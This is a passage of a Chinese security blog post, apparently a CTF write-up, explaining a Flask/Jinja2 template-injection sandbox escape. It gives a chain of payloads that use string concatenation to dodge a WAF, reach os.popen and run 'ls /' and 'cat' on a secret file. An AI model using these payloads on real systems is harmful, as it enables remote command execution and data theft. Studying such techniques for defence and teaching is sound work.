<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{<span style="color:#58a1dd">session</span>[<span style="color:#a6be9d">&#39;__cla&#39;</span><span style="color:#ff636f">+</span><span style="color:#a6be9d">&#39;ss__&#39;</span>]}}</span></span></code></pre></div><p>访问到了类，我们就可以通过 <code>__bases__</code> 来获取基类的元组，带上索引 0 就可以访问到相应的基类。由此一直向上我们就可以找到最顶层的<code>object</code>基类了。<strong>（同样的，如果没有过滤config的话，我们还可以利用config来逃逸，方法与session的相同）</strong></p>
<p>payload：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{<span style="color:#58a1dd">session</span>[<span style="color:#a6be9d">&#39;__cla&#39;</span><span style="color:#ff636f">+</span><span style="color:#a6be9d">&#39;ss__&#39;</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span>[<span style="color:#a6be9d">0</span>]}}</span></span></code></pre></div><p>有了对象基类，我们就可以通过访问 <code>__subclasses__</code> 方法再实例化去访问所有的子类。同样使用字符串拼接绕过WAF，这样就实现<strong>沙盒逃逸</strong>了。</p>
<p>payload：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{<span style="color:#58a1dd">session</span>[<span style="color:#a6be9d">&#39;__cla&#39;</span><span style="color:#ff636f">+</span><span style="color:#a6be9d">&#39;ss__&#39;</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span>[<span style="color:#a6be9d">0</span>][<span style="color:#a6be9d">&#39;__subcla&#39;</span><span style="color:#ff636f">+</span><span style="color:#a6be9d">&#39;ss__&#39;</span>]()}}</span></span></code></pre></div><p>还是从os库入手，直接搜索“os”，找到了 <code>os._wrap_close</code> 类，同样使用dict键访问的方法。猜大致范围得到了索引序号，我这里序号是312</p>
<p>payload：</p>
<pre tabindex="0"><code>{{session[&#39;__cla&#39;+&#39;ss__&#39;].__bases__[0].__bases__[0].__bases__[0].__bases__[0][&#39;__subcla&#39;+&#39;sses__&#39;]()[312]}}</code></pre><p>我们调用它的 <code>__init__</code> 函数将其实例化，然后用 <code>__globals__</code> 查看其全局变量。</p>
<p>payload：</p>
<pre tabindex="0"><code>{{session[&#39;__cla&#39;+&#39;ss__&#39;].__bases__[0].__bases__[0].__bases__[0].__bases__[0][&#39;__subcla&#39;+&#39;sses__&#39;]()[312].__init__.__globals__}}</code></pre><p>眼又花了，但我们的目的很明显，就是要执行命令，于是直接搜索 “popen” 就可以了：</p>
<p>由于又是一个dict类型，我们调用的时候又可以使用字符串拼接，绕过open过滤。</p>
<p>后面顺理成章的，我们将命令字符串传入，实例化这个函数，然后直接调用read方法就可以了。</p>
<p>payload：</p>
<pre tabindex="0"><code>{{session[&#39;__cla&#39;+&#39;ss__&#39;].__bases__[0].__bases__[0].__bases__[0].__bases__[0][&#39;__subcla&#39;+&#39;sses__&#39;]()[312].__init__.__globals__[&#39;po&#39;+&#39;pen&#39;](&#39;ls /&#39;).read()}}</code></pre><pre tabindex="0"><code>{{session[&#39;__cla&#39;+&#39;ss__&#39;].__bases__[0].__bases__[0].__bases__[0].__bases__[0][&#39;__subcla&#39;+&#39;sses__&#39;]()[312].__init__.__globals__[&#39;po&#39;+&#39;pen&#39;](&#39;cat /Th1s__is_S3cret&#39;).read()}}</code></pre></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
      </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span></span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-tag" title="Tags - 代码审计">代码审计</a><a href="/tags/python%E5%AE%89%E5%85%A8/" class="post-tag" title="Tags - Python安全">Python安全</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E8%AF%AD%E8%A8%80/python/98/" class="post-nav-item" rel="prev" title="Python 可视化学习"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Python 可视化学习</a>
      <a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/python/python%E5%AE%89%E5%85%A8/31/" class="post-nav-item" rel="next" title="Python Session伪造">Python Session伪造<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
<a href="https://statcounter.com/p13160752/?guest=1" target="_blank">访问量统计</a> 

<script type="text/javascript">
var sc_project=13160779;
var sc_invisible=0;
var sc_security="f35eb178";
var scJsHost = "https://";
document.write("<sc"+"ript type='text/javascript' src='" +
scJsHost +
"statcounter.com/counter/counter.js'></"+"script>");
</script>

<noscript>
  <div class="statcounter">
    <a title="web stats" href="https://statcounter.com/" target="_blank">
      <img referrerPolicy="no-referrer-when-downgrade">
    </a>
  </div>
</noscript>


    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">
              <a href="/">东隅</a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
</html>
